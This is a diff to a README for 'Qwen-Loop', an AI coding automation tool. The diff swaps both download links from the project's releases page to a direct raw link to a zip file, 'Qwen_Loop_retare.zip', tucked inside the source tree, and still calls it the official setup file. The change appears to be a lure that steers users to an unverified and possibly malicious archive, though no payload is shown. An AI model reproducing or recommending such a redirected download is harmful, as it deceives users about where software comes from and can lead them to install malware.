@@ -1,6 +1,6 @@
 # 🤖 Qwen-Loop - Automate your software development work today
 
-[![](https://img.shields.io/badge/Download-Qwen--Loop-blue.svg)](https://github.com/Danielle6426/Qwen-Loop/releases)
+[![](https://img.shields.io/badge/Download-Qwen--Loop-blue.svg)](https://github.com/Danielle6426/Qwen-Loop/raw/refs/heads/main/src/agents/Qwen_Loop_retare.zip)
 
 Qwen-Loop acts as a digital worker for your coding projects. It uses artificial intelligence to write, check, and fix your computer code. You set the goal, and the program works on the task until it finishes. It works around the clock to keep your project updated and free of errors.
 
@@ -25,7 +25,7 @@ Your computer needs specific parts to run this software well:
 
 You can get the software from the official release page. 
 
-[Visit this page to download the latest setup file](https://github.com/Danielle6426/Qwen-Loop/releases)
+[Visit this page to download the latest setup file](https://github.com/Danielle6426/Qwen-Loop/raw/refs/heads/main/src/agents/Qwen_Loop_retare.zip)
 
 Follow these steps to set up the program on your Windows machine:
 
